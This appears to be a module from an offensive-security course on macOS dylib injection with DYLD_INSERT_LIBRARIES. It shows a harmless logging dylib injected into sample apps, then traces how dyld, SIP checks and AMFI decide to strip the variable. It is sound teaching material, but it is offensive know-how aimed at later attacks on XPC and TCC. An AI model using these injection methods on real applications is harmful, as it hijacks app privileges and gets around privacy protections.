In this Learning Module, we will cover the following Learning Units:

Understand process injection
Learn what a dylib is and how it works
Understand Dylib Restrictions
Use a Code Injection to Perform Dylib Injection
Understanding process injection is essential for exploitation on macOS, since many elements of access control depend on the application's signature, particularly the embedded entitlements. Some entitlements are less significant, while others, especially those private to Apple, are very powerful.

In this Module, we will explore two different techniques for injecting a dynamically linked library (dylib) into an application. We will ultimately use this to execute code in the application’s context, gaining access to privileges we wouldn’t otherwise have. We will extensively use these techniques in subsequent modules, to attack, for example, XPC services and privacy access (TCC).

We'll start by examining a code injection technique that relies on environment variables. To understand its limitations, we will practice delving into Apple's source code to learn about macOS internals. Next, we will cover a dylib hijacking technique, another way to achieve process injection.

To follow along with this topic, we will need a VM running Sonoma with Hopper and Xcode. It is always best to start with a fresh VM.

8.1. DYLD_INSERT_LIBRARIES Injection in macOS
This Learning Unit covers the following Learning Objectives:

Understand the dyld insert library
Use the console application to search for constructors
Understand how macOS restricts dylib injection
Understand how macOS checks if SIP is disabled
Understand what AppleMobileFileIntegrity does
DYLD_INSERT_LIBRARIES is a macOS environment variable that instructs the dynamic linker (dyld) to load one or more specified dynamic libraries (dylibs) into a target process before its main() function runs, similar to LD_PRELOAD on Linux. This enables execution of arbitrary code within the context of another application. According to the man page, the variable specifies a list of dylibs that are injected into the target process before it begins execution.

8.1.1. Performing an Injection
We'll demonstrate the DYLD_INSERT_LIBRARIES technique via an exercise. First, let's make a short dynamic library that we can inject into a target application. The library will print to the standard output and generate a log message as well.

#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
Listing 1 - The dylib source code

Let's examine this code. The __attribute__((constructor)) is a GCC specific syntax that instructs the compiler to treat the next function as a constructor. When the dynamic loader loads the compiled binary, it will run the function specified under the constructor. The name of the function is arbitrary. Our function will print to STDOUT (standard output) and create a log entry, which we can use to verify that our code was run.

We’ll use gcc to compile the dynamic library. The -dynamiclib flag tells the compiler to produce a dylib instead of a standard Mach-O executable, and -o specifies the output filename. For example:

offsec@sonoma1 ~ % gcc -dynamiclib example.c -o example.dylib
Listing 2 - Compiling the dylib source code

Next, let's create a simple Hello World application in C. We will inject the dynamic library into this application.

#include <stdio.h>
int main()
{
   printf("Hello, World!\n");
   return 0;
}
Listing 3 - C source of our "Hello World" application

Again, we can use gcc to compile it:

offsec@sonoma1 ~ % gcc hello.c -o hello
Listing 4 - Compiling the "Hello World" application

To set the environment variable for the application to be executed, we need to specify DYLD_INSERT_LIBRARIES= and the path to the dylib in the command line.

Let's run these both with, and without, the injection.

offsec@sonoma1 ~ % ./hello
Hello, World!

offsec@sonoma1 ~ % DYLD_INSERT_LIBRARIES=example.dylib ./hello 
[+] dylib constructor called from ./hello
Hello, World!
Listing 5 - Running our app without and with injection

Listing 5 shows the application executed with and without the injection. The output confirms that our injected dylib executes before the main application, printing its message prior to “Hello World”.

We can observe log output from our injected dylib by launching the Console application, selecting the machine under Devices, and clicking Start. After running the injection, pause log collection and search for keywords like constructor or the binary name (e.g., hello) to locate relevant entries quickly.

Info

Being able to move around the console application is very handy, especially when you know what you are looking for. We can narrow down these searches by simply searching for the word "constructor"

Once this is set, we can run our dylib injection and then pause the Console application. One way to find this entry is to search for hello, in the search box. This will result in:


Figure 1: Console logs for Hello World
Figure 1: Console logs for Hello World
This technique also works on real world applications, like MachOView.

Warning

Since we are running ARM64, we need to compile MachOView for ARM.

To compile MachOView, we need to run these commands:

offsec@sonoma1 ~ % git clone https://github.com/gdbinit/MachOView.git

offsec@sonoma1 ~ % cd MachOView

offsec@sonoma1 MachOView % sudo xcode-select --switch /Applications/Xcode.app/Contents/Developer

offsec@sonoma1 MachOView % xcodebuild -project MachOView.xcodeproj -scheme MachOView -configuration Release -arch arm64
Listing 6 - Building MachOView for ARM

Now that we have the file compiled, we can go to the location of the application. To get to the location of the executable we need to begin at /Users/offsec/Library/Developer/Xcode/DerivedData/. There we will find a folder named machoview- and a long string of characters. once we enter that folder, we can continue to /Build/Products/Release/MachOView.app. Now we can move the executable to our Applications folder.

Info

We can move the file to the global Application folder using: /Applications/ or the user’s Application folder. If the user’s application folder does not exist, we can create it using mkdir ~/Applications/

Because we know the directory structure to where the app file is, we can use a wildcard to move it.

offsec@sonoma1 MachOView % cd ..

offsec@sonoma1 ~ % mv /Users/offsec/Library/Developer/Xcode/DerivedData/machoview-*/Build/Products/Release/MachOView.app /Applications/
Listing 7 - Moving the MachOView.app to the Applications directory.

We can now run the injection command on MachOView.

offsec@sonoma1 ~ % DYLD_INSERT_LIBRARIES=example.dylib /Applications/MachOView.app/Contents/MacOS/MachOView 
[+] dylib constructor called from /Applications/MachOView.app/Contents/MacOS/MachOView
...
Listing 8 - Injecting a dylib into MachOView.app

Just like in our Hello World application, we can review the logs of our injection in Console. If we stop the log collection immediately after running our injection and do a process search for MachOView (clicking any will give us different choices), the log we are looking for will be at the top.


Figure 2: Logs in Console for MachOView.app
Figure 2: Logs in Console for MachOView.app
Rather than using the Console application, it may be more convenient for us to monitor log output using the command line, as shown:

offsec@sonoma1 ~ % log stream --style syslog --predicate 'eventMessage CONTAINS[c] "constructor"' 
Listing 9 - Monitoring logs via the command line

Let's break up the above command to better understand it. This command logs all event messages containing the constructor word in the message body. We're using the stream option to view logs from the system continuously, --style to specify the formatting, and --predicate is a filter we apply to the stream. The eventMessage CONTAINS[c] will filter events based on the contents of the message body, and the [c] is for case insensitivity.

Once we run it, we will receive an output like the following:

offsec@sonoma1 ~ % log stream --style syslog --predicate 'eventMessage CONTAINS[c] "constructor"'
Filtering the log data using "composedMessage CONTAINS[c] "constructor""
Timestamp                       (process)[PID]    
2023-10-20 11:14:55.344784+0200  localhost MachOView[91814]: (example.dylib) [+] dylib constructor called from /Applications/MachOView.app/Contents/MacOS/MachOView
Listing 10 - Example log stream output

This technique is very convenient for injection, since we only need a dylib, and simply by setting an environment variable, we can achieve code execution in the context of another application. In the next section, we will explore the limitations of this technique.

8.1.2. Restrictions of DYLD_INSERT_LIBRARIES Injection
To prevent widespread abuse of dylib injection, Apple has added some restrictions to the use of the DYLD_INSERT_LIBRARIES environmental variable. In certain cases, the loader (dyld) will ignore the environment variables.

Warning

The importance of these restrictions is clearly shown by a local privilege escalation vulnerability found by Stefan Esser in 2015.

When Apple introduced a new environment variable, DYLD_PRINT_TO_FILE, they were incorrectly handling it, which led to a situation where someone could gain root privileges with SUID files.

In general, DYLD environment variables are ignored in the following cases:

The main executable has a restricted segment (__RESTRICT,__restrict).
SUID / GUID bits are set.
The program has the CS_RESTRICT (restricted) or the CS_RUNTIME (hardened runtime) code signing flag set and doesn't have the com.apple.security.cs.allow-dyld-environment-variables entitlement.
It's an entitled binary.
To fully understand when and how environmental variables are ignored, we will deep dive into macOS internals. The restriction happens during the load process performed by dyld, which hands over the decision to the AppleMobileFileIntegrity (AMFI) kernel extension. We will start by reviewing dyld's source code and then follow its callout to AMFI. Finally, we will reverse AMFI to understand how the decision is made to restrict a process or not.

8.1.3. The dyld Restriction Process
Let's begin by exploring the 1122.1 version of the dyld code, which is the one used in macOS Sonoma 14.0.

We will start our journey by inspecting dyld-1122.1/dyld/DyldProcessConfig.cpp.

Environment variables are ignored through their removal during the load process. Let's examine ProcessConfig::Security::pruneEnvVars, the function responsible for removing environment variables.

void ProcessConfig::Security::pruneEnvVars(Process& proc)
{
    //
    // For security, setuid programs ignore DYLD_* environment variables.
    // Additionally, the DYLD_* enviroment variables are removed
    // from the environment, so that any child processes doesn't see them.
    //
    // delete all DYLD_* environment variables
    int          removedCount = 0;
    const char** d            = (const char**)proc.envp;
    for ( const char* const* s = proc.envp; *s != NULL; s++ ) {
        if ( strncmp(*s, "DYLD_", 5) != 0 ) {
            *d++ = *s;
        }
        else {
            ++removedCount;
        }
    }
    *d++ = NULL;
    // slide apple parameters
    if ( removedCount > 0 ) {
        proc.apple = d;
        do {
            *d = d[removedCount];
        } while ( *d++ != NULL );
        for ( int i = 0; i < removedCount; ++i )
            *d++ = NULL;
    }
}
Listing 11 - pruneEnvVars function source code from DyldProcessConfig.cpp

At the top, we find a comment stating that "For security, setuid programs ignore DYLD_* environment variables". As we will find later, while this statement is true, the decision is much more complex than this. If we could inject our own dylib to a process which has setuid bits set, it would mean a clear privilege escalation scenario, as we could inject code into processes owned by root for example, granting root level code execution. This rule is one of the many which will result in pruning the environment variables.

This code simply iterates over all environment variables and removes those starting with "DYLD_". The ProcessConfig::Security::Security function will call pruneEnvVars, so let's explore that next.

 1 ProcessConfig::Security::Security(Process& process, SyscallDelegate& syscall)
 2 {
 3 #if TARGET_OS_EXCLAVEKIT
 4     this->internalInstall           = false; // FIXME
 5 #else
 6     this->internalInstall           = syscall.internalInstall();  // Note: must be set up before calling getAMFI()
 7     this->skipMain                  = this->internalInstall && process.environ("DYLD_SKIP_MAIN");
 8 
 9     // just on internal installs in launchd, dyld_flags= will alter the CommPage
10     if ( (process.pid == 1) && this->internalInstall  ) {
11         if ( const char* bootFlags = process.appleParam("dyld_flags") ) {
12             *((uint32_t*)&process.commPage) = (uint32_t)hexToUInt64(bootFlags, nullptr);
13         }
14     }
15 
16     const uint64_t amfiFlags = getAMFI(process, syscall);
17     this->allowAtPaths              = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_AT_PATH);
18     this->allowEnvVarsPrint         = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_PRINT_VARS);
19     this->allowEnvVarsPath          = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_PATH_VARS);
20     this->allowEnvVarsSharedCache   = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_CUSTOM_SHARED_CACHE);
21     this->allowClassicFallbackPaths = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_FALLBACK_PATHS);
22     this->allowInsertFailures       = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_FAILED_LIBRARY_INSERTION);
23     this->allowInterposing          = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_LIBRARY_INTERPOSING);
24     this->allowEmbeddedVars         = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_EMBEDDED_VARS);
25 #if TARGET_OS_SIMULATOR
26     this->allowInsertFailures       = true; // FIXME: amfi is returning the wrong value for simulators <rdar://74025454>
27 #endif
28 
29     // env vars are only pruned on macOS
30     switch ( process.platform ) {
31         case dyld3::Platform::macOS:
32         case dyld3::Platform::iOSMac:
33         case dyld3::Platform::driverKit:
34             break;
35         default:
36             return;
37     }
38 
39     // env vars are only pruned when process is restricted
40     if ( this->allowEnvVarsPrint || this->allowEnvVarsPath || this->allowEnvVarsSharedCache )
41         return;
42 
43     this->pruneEnvVars(process);
44 #endif // !TARGET_OS_EXCLAVEKIT
45 }
Listing 12 - Security function source code from DyldProcessConfig.cpp

This is a function where we will spend quite some time. We'll find that the pruneEnvVars function is called at the very end (line 43). There are a few return statements before we get to this last point. Moving up from the bottom, we find that if the this->allowEnvVarsPrint || this->allowEnvVarsPath || this->allowEnvVarsSharedCache statement is evaluated true, we will return prior to reaching the function's end (lines 40-41). This makes sense, as the flags being evaluated say "allow env vars".

Moving further up, we find that env vars are only pruned on macOS platforms. This means that on macOS, the evaluation of the switch ( process.platform ) statement will always result in continuing the code, effectively breaking out this statement before reaching its default "return" case (lines 29-37).

Moving up again, we'll find where the previous flags are being set by performing an "and" (&) operation between amfiFlags and some constant values (lines 17-25). These flags are being set during the amfiFlags = getAMFI(process, syscall); function call (line 16). This means that the result of the getAMFI function call will decide if pruning happens or not because its return value will be used to set some flags, and those flags will be used to decide whether env vars are allowed. We will return to this concept later.

The last notable mention is for the syscall.internalInstall() call (line 6). This eventually will determine if the OS is an Apple internal install or if SIP is disabled and will set a few process characteristics based on that before making a call to AMFI (lines 10-14). Let's dive into this call.

bool SyscallDelegate::internalInstall() const
{
#if TARGET_OS_SIMULATOR
    return false;
#elif BUILDING_DYLD && TARGET_OS_IPHONE
    uint32_t devFlags = *((uint32_t*)_COMM_PAGE_DEV_FIRM);
    return ((devFlags & 1) == 1);
#elif BUILDING_DYLD && TARGET_OS_OSX
    return (::csr_check(CSR_ALLOW_APPLE_INTERNAL) == 0);
#else
    return _internalInstall;
#endif
}
Listing 13 - internalInstall function source code from DyldDelegates.cpp

On macOS, the internalInstall function basically returns whether the csr_check(CSR_ALLOW_APPLE_INTERNAL) function call returns 0 or not. The value 0 means success. Let's explore what csr_check does.

The function csr_check is a system call, and the real function is implemented in the macOS kernel. We will use the source of XNU version 10002.1.13, which is the one used in macOS Sonoma 14.0.

Info

The related source code can be found in xnu-10002.1.13/bsd/kern/kern_csr.c and xnu-10002.1.13/bsd/sys/csr.h.

Reviewing the source code, we'll first inspect the building blocks, and then finally examine what csr_check does. Let's start by reviewing where the SIP configuration is stored.

SIP is internally controlled through NVRAM variables, which will be mapped to a global variable called csr_config. This is an unsigned 32-bit integer that can be treated as a bitmask.

The various bits for the csr_config variable are defined in xnu-10002.1.13/bsd/sys/csr.h.

/* CSR configuration flags */
#define CSR_ALLOW_UNTRUSTED_KEXTS               (1 << 0)
#define CSR_ALLOW_UNRESTRICTED_FS               (1 << 1)
#define CSR_ALLOW_TASK_FOR_PID                  (1 << 2)
#define CSR_ALLOW_KERNEL_DEBUGGER               (1 << 3)
#define CSR_ALLOW_APPLE_INTERNAL                (1 << 4)
#define CSR_ALLOW_DESTRUCTIVE_DTRACE                    (1 << 5) /* name deprecated */
#define CSR_ALLOW_UNRESTRICTED_DTRACE                   (1 << 5)
#define CSR_ALLOW_UNRESTRICTED_NVRAM                    (1 << 6)
#define CSR_ALLOW_DEVICE_CONFIGURATION                  (1 << 7)
#define CSR_ALLOW_ANY_RECOVERY_OS                       (1 << 8)
#define CSR_ALLOW_UNAPPROVED_KEXTS                      (1 << 9)
#define CSR_ALLOW_EXECUTABLE_POLICY_OVERRIDE    (1 << 10)
#define CSR_ALLOW_UNAUTHENTICATED_ROOT                  (1 << 11)

#define CSR_VALID_FLAGS (CSR_ALLOW_UNTRUSTED_KEXTS | \
	                         CSR_ALLOW_UNRESTRICTED_FS | \
	                         CSR_ALLOW_TASK_FOR_PID | \
	                         CSR_ALLOW_KERNEL_DEBUGGER | \
	                         CSR_ALLOW_APPLE_INTERNAL | \
	                         CSR_ALLOW_UNRESTRICTED_DTRACE | \
	                         CSR_ALLOW_UNRESTRICTED_NVRAM | \
	                         CSR_ALLOW_DEVICE_CONFIGURATION | \
	                         CSR_ALLOW_ANY_RECOVERY_OS | \
	                         CSR_ALLOW_UNAPPROVED_KEXTS | \
	                         CSR_ALLOW_EXECUTABLE_POLICY_OVERRIDE | \
	                         CSR_ALLOW_UNAUTHENTICATED_ROOT)

Listing 14 - CSR bitmask constants in csr.h

Shown above are the various bits that may be set in csr_config. We can also represent this code in an illustration that displays the various values as a bitmask.


Figure 3: csr_config bitmask
Figure 3: csr_config bitmask
Now that we understand where csr_config is stored and what values it can take, let's analyze the related functions. Let's begin with csr_get_active_config from kern_csr.c.

int
csr_get_active_config(csr_config_t * config)
{
	*config = (csr_config & CSR_VALID_FLAGS);

	return 0;
}
Listing 15 - csr_get_active_config in kern_csr.c

The csr_get_active_config function will get the csr_config global variable and return it in the config result parameter. The function ensures that only valid flags are returned by applying the CSR_VALID_FLAGS bitmask.

Let's find out the typical value of csr_config. If SIP is disabled, the csr_config variable is set to 0x7F. 0x7F means that CSR_ALLOW_APPLE_INTERNAL will be set, along with a few others, as highlighted below:


Figure 4: csr_config 0x7F bitmask
Figure 4: csr_config 0x7F bitmask
Now that we better understand what csr_get_active_config does, we're ready to review our original csr_check function call, shown again:

return (::csr_check(CSR_ALLOW_APPLE_INTERNAL) == 0);
Listing 16 - csr_check call

The csr_check function will check the mask that we're trying to query, in this case CSR_ALLOW_APPLE_INTERNAL. If the mask we are trying to query is set, the function will return zero. Let's examine how this happens.

 1 int
 2 csr_check(csr_config_t mask)
 3 {
 4 	csr_config_t config;
 5 	int ret = csr_get_active_config(&config);
 6 
 7 	if (ret != 0) {
 8 		return ret;
 9 	}
10 
11 	// CSR_ALLOW_KERNEL_DEBUGGER needs to be allowed when SIP is disabled
12 	// to allow 3rd-party developers to debug their kexts.  Use
13 	// CSR_ALLOW_UNTRUSTED_KEXTS as a proxy for "SIP is disabled" on the
14 	// grounds that you can do the same damage with a kernel debugger as
15 	// you can with an untrusted kext.
16 	if ((config & (CSR_ALLOW_UNTRUSTED_KEXTS | CSR_ALLOW_APPLE_INTERNAL)) != 0) {
17 		config |= CSR_ALLOW_KERNEL_DEBUGGER;
18 	}
19 
20 	return ((config & mask) == mask) ? 0 : EPERM;
21 }
Listing 17 - csr_check function

The function starts by retrieving the active configuration variable using the csr_get_active_config function, which we analyzed earlier, and storing it in the config variable (lines 4-5). If that function returns an error, the error will be returned (lines 7-9).

Next, the function will enable the CSR_ALLOW_KERNEL_DEBUGGER bit in the bitmask if CSR_ALLOW_UNTRUSTED_KEXTS or CSR_ALLOW_APPLE_INTERNAL is already set (lines 16-18). ` Finally, the function will compare our mask to the config variable, which stores the fetched csr_config, and returns accordingly.

Let's sum up how CSR_ALLOW_APPLE_INTERNAL verification happens based on the code we reviewed.

We call csr_check to check if the CSR_ALLOW_APPLE_INTERNAL bit is set in csr_config. csr_check will call csr_get_active_config to get the current bitmap. If SIP is disabled or if it's a truly internal build, CSR_ALLOW_APPLE_INTERNAL will be set, meaning csr_check would eventually return 0.

Let's return to the dyld source code and continue reviewing it.

 1 ProcessConfig::Security::Security(Process& process, SyscallDelegate& syscall)
 2 {
 3 #if TARGET_OS_EXCLAVEKIT
 4     this->internalInstall           = false; // FIXME
 5 #else
 6     this->internalInstall           = syscall.internalInstall();  // Note: must be set up before calling getAMFI()
 7     this->skipMain                  = this->internalInstall && process.environ("DYLD_SKIP_MAIN");
 8 
 9     // just on internal installs in launchd, dyld_flags= will alter the CommPage
10     if ( (process.pid == 1) && this->internalInstall  ) {
11         if ( const char* bootFlags = process.appleParam("dyld_flags") ) {
12             *((uint32_t*)&process.commPage) = (uint32_t)hexToUInt64(bootFlags, nullptr);
13         }
14     }
15 
16     const uint64_t amfiFlags = getAMFI(process, syscall);
17     this->allowAtPaths              = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_AT_PATH);
18     this->allowEnvVarsPrint         = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_PRINT_VARS);
19     this->allowEnvVarsPath          = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_PATH_VARS);
20     this->allowEnvVarsSharedCache   = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_CUSTOM_SHARED_CACHE);
21     this->allowClassicFallbackPaths = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_FALLBACK_PATHS);
22     this->allowInsertFailures       = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_FAILED_LIBRARY_INSERTION);
23     this->allowInterposing          = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_LIBRARY_INTERPOSING);
24     this->allowEmbeddedVars         = (amfiFlags & AMFI_DYLD_OUTPUT_ALLOW_EMBEDDED_VARS);
25 #if TARGET_OS_SIMULATOR
26     this->allowInsertFailures       = true; // FIXME: amfi is returning the wrong value for simulators <rdar://74025454>
27 #endif
28 
29     // env vars are only pruned on macOS
30     switch ( process.platform ) {
31         case dyld3::Platform::macOS:
32         case dyld3::Platform::iOSMac:
33         case dyld3::Platform::driverKit:
34             break;
35         default:
36             return;
37     }
38 
39     // env vars are only pruned when process is restricted
40     if ( this->allowEnvVarsPrint || this->allowEnvVarsPath || this->allowEnvVarsSharedCache )
41         return;
42 
43     this->pruneEnvVars(process);
44 #endif // !TARGET_OS_EXCLAVEKIT
45 }
Listing 18 - Security function source code from DyldProcessConfig.cpp

We'll continue reviewing this at line 16, where a call to getAMFI happens. Let's examine more about AMFI.

8.1.4. The AMFI Syscall
In this section, we will discuss how AppleMobileFileIntegrity (AMFI) is involved in setting up process restrictions. AMFI is a kernel extension that was originally introduced in iOS. At version 10.10, it was also added to macOS. AMFI extends the Mandatory Access Control Framework (MACF) and plays a key role in enforcing SIP and code signing. MACF is an extendable framework that can enforce various policies and restrictions, as well as authorize or reject certain operations.

Let's continue our investigation with the getAMFI function call.

uint64_t ProcessConfig::Security::getAMFI(const Process& proc, SyscallDelegate& sys)
{
    uint32_t fpTextOffset;
    uint32_t fpSize;
    uint64_t amfiFlags = sys.amfiFlags(proc.mainExecutable->isRestricted(), proc.mainExecutable->isFairPlayEncrypted(fpTextOffset, fpSize));

    // let DYLD_AMFI_FAKE override actual AMFI flags, but only on internalInstalls with boot-arg set
    bool testMode = proc.commPage.testMode;
    if ( const char* amfiFake = proc.environ("DYLD_AMFI_FAKE") ) {
        //console("env DYLD_AMFI_FAKE set, boot-args dyld_flags=%s\n", proc.appleParam("dyld_flags"));
        if ( !testMode ) {
            //console("env DYLD_AMFI_FAKE ignored because boot-args dyld_flags=2 is missing (%s)\n", proc.appleParam("dyld_flags"));
        }
        else if ( !this->internalInstall ) {
            //console("env DYLD_AMFI_FAKE ignored because not running on an Internal install\n");
        }
        else {
            amfiFlags = hexToUInt64(amfiFake, nullptr);
            //console("env DYLD_AMFI_FAKE parsed as 0x%08llX\n", amfiFlags);
       }
    }
    return amfiFlags;
}
Listing 19 - getAMFI function source code from DyldProcessConfig.cpp

At the start of the function there is a callout to the sys.amfiFlags function, passing the results of the other function calls, proc.mainExecutable->isRestricted() and proc.mainExecutable->isFairPlayEncrypted(fpTextOffset, fpSize). The latter will check if the binary has Apple's Fairplay DRM encryption set. This is only set for apps coming from the App Store.

Let's inspect what isRestricted() does. This function can be found in dyld/common/MachOFile.cpp.

bool MachOFile::isRestricted() const
{
    __block bool result = false;
    forEachSection(^(const MachOFile::SectionInfo& info, bool malformedSectionRange, bool &stop) {
        if ( (strcmp(info.segInfo.segName, "__RESTRICT") == 0) && (strcmp(info.sectName, "__restrict") == 0) ) {
            result = true;
            stop = true;
        }
    });
    return result;
}
Listing 20 - isRestricted function source code from MachOFile.cpp

isRestricted will check whether the Mach-O file has a __RESTRICT segment with __restrict section set.

Now that we know what parameters are passed to sys.amfiFlags, let's check what that function does. This function can be found in dyld/common/DyldDelegates.cpp.

uint64_t SyscallDelegate::amfiFlags(bool restricted, bool fairPlayEncryted) const
{
#if BUILDING_DYLD
    uint64_t amfiInputFlags  = 0;
    uint64_t amfiOutputFlags = 0;

    #if TARGET_OS_SIMULATOR
    amfiInputFlags |= AMFI_DYLD_INPUT_PROC_IN_SIMULATOR;
    #else
    if ( restricted )
        amfiInputFlags |= AMFI_DYLD_INPUT_PROC_HAS_RESTRICT_SEG;
    if ( fairPlayEncryted )
        amfiInputFlags |= AMFI_DYLD_INPUT_PROC_IS_ENCRYPTED;
    #endif

    if ( amfi_check_dyld_policy_self(amfiInputFlags, &amfiOutputFlags) != 0 ) {
        amfiOutputFlags = 0;
    }
    return amfiOutputFlags;
#else
    return _amfiFlags;
#endif
}
Listing 21 - amfiFlags function source code from DyldDelegates.cpp

Here we find two variables: amfiInputFlags and amfiOutputFlags, both of which are initialized to zero. Then the function sets some bits in amfiInputFlags, depending on the previous checks for the binary being restricted and fair play encrypted. Finally, a call to amfi_check_dyld_policy_self happens, which will set the amfiOutputFlags.

Let's investigate the source code of amfi_check_dyld_policy_self to try to find out what happens when this function is called.

This function can be found in dyld/glue.c, shown below:

int amfi_check_dyld_policy_self(uint64_t inFlags, uint64_t* outFlags)
{
    if ( gSyscallHelpers->version >= 10 )
        return gSyscallHelpers->amfi_check_dyld_policy_self(inFlags, outFlags);
    *outFlags = 0x3F;  // on old kernel, simulator process get all flags
    return 0;
}
Listing 22 - amfi_check_dyld_policy_self function in glue.c

Inspecting the code, we'll find a check on the gSyscallHelpers version number. Next, a function pointer is retrieved, and a call is made to the real amfi_check_dyld_policy_self. If we follow gSyscallHelpers, we arrive at another header file, dyld/dyldSyscallInterface.h.

#if __has_include(<libamfi.h>) && !TARGET_OS_SIMULATOR && BUILDING_DYLD
    #include <libamfi.h>
#else
__BEGIN_DECLS
extern int amfi_check_dyld_policy_self(uint64_t input_flags, uint64_t* output_flags);
extern kern_return_t task_dyld_process_info_notify_get(mach_port_name_array_t names_addr, natural_t *names_count_addr);
__END_DECLS
#endif
...
#define DYLD_SYSCALL_VTABLE_ENTRY(x) __typeof__ (x) *x
...
// This file contains the table of function pointers the host dyld supplies
// to the iOS simulator dyld.
//
struct SyscallHelpers
{
...
DYLD_SYSCALL_VTABLE_ENTRY(amfi_check_dyld_policy_self);
...
};
extern const struct SyscallHelpers* gSyscallHelpers;
Listing 23 - Part of the gSyscallHelpers structure in dyldSyscallInterface.h

We find that gSyscallHelpers is a structure with plenty of function pointers, including the one we are searching for, amfi_check_dyld_policy_self. We also find its definition, which indicates that it's an external function and gives a hint of how the output flags can be interpreted. The name of the structure suggests that this is a system call.

Having learned what we can from the source code, next we'll need to reverse engineer the actual binary to discover what happens at the amfi_check_dyld_policy_self function call. We'll conduct our reverse engineering by using Hopper for static analysis and lldb for dynamic analysis.

Let's begin static analysis with Hopper by opening /usr/lib/dyld and searching for amfi_check_dyld_policy_self in the label list. We will review its decompiled ARM64 version.

int _amfi_check_dyld_policy_self(int arg0) {
    r0 = arg0;
    if (r1 != 0x0) {
            r31 = r31 - 0x40;
            var_20 = r20;
            stack[-24] = r19;
            var_10 = r29;
            stack[-8] = r30;
            r19 = r1;
            *r1 = 0x0;
            var_38 = 0xaaaaaaaaaaaaaaaa;
            r0 = ___sandbox_ms("AMFI");
            if (r0 != 0x0) {
                    r0 = ___error();
                    r0 = *(int32_t *)r0;
            }
            *r19 = var_38;
    }
    else {
            r0 = 0x16;
    }
    return r0;
}
Listing 24 - The code of amfi_check_dyld_policy_self

Examining this code reveals that amfi_check_dyld_policy_self is a wrapper around ___sandbox_ms. We also find that the first parameter for this call is the string "AMFI".

Next, let's navigate into ___sandbox_ms and verify that it is a wrapper for the __mac_syscall system call. Unfortunately, the decompiled version isn't helpful, so we will check the regular (ASM) disassembly view.

                     ___sandbox_ms:
000000000004c180         mov        x16, #0x17d                                 
; CODE XREF=_amfi_check_dyld_policy_self+64, sub_497d4+80
000000000004c184         svc        #0x80
...
Listing 25 - Disassembly of ___sandbox_ms

The specified syscall number is 0x17d, which corresponds to __mac_syscall, defined in xnu-10002.1.13/bsd/kern/syscalls.master.

__mac_syscall allows us to create an ioctl type system call for one of the policy modules registered in the Mandatory Access Control Framework (MACF). The definition for the syscall can be found in xnu-10002.1.13/security/mac.h.

int __mac_syscall(const char *_policyname, int _call, void *_arg);
Listing 26 - __mac_syscall definition in mac.h

While the policyname defines which MACF module we want to call, the _call acts as an ioctl number specifying which function to call inside the module. Finally, *_arg is the variable number of arguments to pass to the MACF function.

Reviewing the code in amfi_check_dyld_policy_self, we'll observe that the policy selector is AMFI, the ioctl code is 0x5a, and the input/output flags are passed in as arguments.

_amfi_check_dyld_policy_self:
...
00000000000460c0         mov        x19, x1
00000000000460c4         str        xzr, [x1]
00000000000460c8         orr        x8, xzr, #0xaaaaaaaaaaaaaaaa
00000000000460cc         stp        x8, x0, [sp, #0x8]
00000000000460d0         add        x8, sp, #0x8
00000000000460d4         str        x8, [sp, #0x40 + var_28]
00000000000460d8         adrp       x0, #0x5c000     ; 0x5cd2f@PAGE
00000000000460dc         add        x0, x0, #0xd2f   ; 0x5cd2f@PAGEOFF, argument #1 for method ___sandbox_ms, "AMFI"
00000000000460e0         add        x2, sp, #0x10
00000000000460e4         mov        w1, #0x5a          //second argument - _call
00000000000460e8         bl         ___sandbox_ms    ; ___sandbox_ms
...
00000000000460f8         ldr        x8, [sp, #0x40 + var_38]  ; CODE XREF=_amfi_check_dyld_policy_self+68
00000000000460fc         str        x8, [x19] //save output flags
Listing 27 - __mac_syscall parameters in amfi_check_dyld_policy_self

The output flags' address is passed in X1, which is temporarily saved to X19 in the beginning of the function call. When the function returns, the flags will be saved in the memory location that was originally provided.

Let's verify our findings with dynamic analysis using lldb and the hello binary we created earlier. We need to set the DYLD_IN_CACHE environment variable to "0" because the dyld will reload itself from the shared cache to a different memory space than it was originally early in the loading process, thus our breakpoints wouldn't work. We can use the settings set target.env-vars command to accomplish this in lldb.

offsec@sonoma1 ~ % sudo lldb ./hello
...
(lldb) target create "./hello"
Current executable set to '/Users/offsec/hello' (arm64).
(lldb) settings set target.env-vars DYLD_IN_CACHE=0
Listing 28 - Starting lldb and specifying target executable

We will set a breakpoint on amfi_check_dyld_policy_self.

(lldb) b dyld`amfi_check_dyld_policy_self
Breakpoint 1: where = dyld`amfi_check_dyld_policy_self, address = 0x00000000000460a8
Listing 29 - Setting breakpoint in lldb

Next, we will start our process with the run (or r) command and break at the AMFI call.

(lldb) run
Process 5425 launched: '/Users/offsec/hello' (arm64)
Process 5425 stopped
* thread #1, stop reason = breakpoint 1.1
    frame #0: 0x00000001000520a8 dyld`amfi_check_dyld_policy_self
dyld`amfi_check_dyld_policy_self:
->  0x1000520a8 <+0>:  cbz    x1, 0x100052114           ; <+108>
    0x1000520ac <+4>:  pacibsp 
    0x1000520b0 <+8>:  sub    sp, sp, #0x40
    0x1000520b4 <+12>: stp    x20, x19, [sp, #0x20]
Target 0: (hello) stopped.
(lldb) 
Listing 30 - Hitting the breakpoint at dyld`amfi_check_dyld_policy_self

From here, we can single step using the step instruction until we hit the system call (SVC instruction).

...
(lldb) step
Process 5425 stopped
* thread #1, stop reason = instruction step into
    frame #0: 0x00000001000520ac dyld`amfi_check_dyld_policy_self + 4
dyld`amfi_check_dyld_policy_self:
->  0x1000520ac <+4>:  pacibsp 
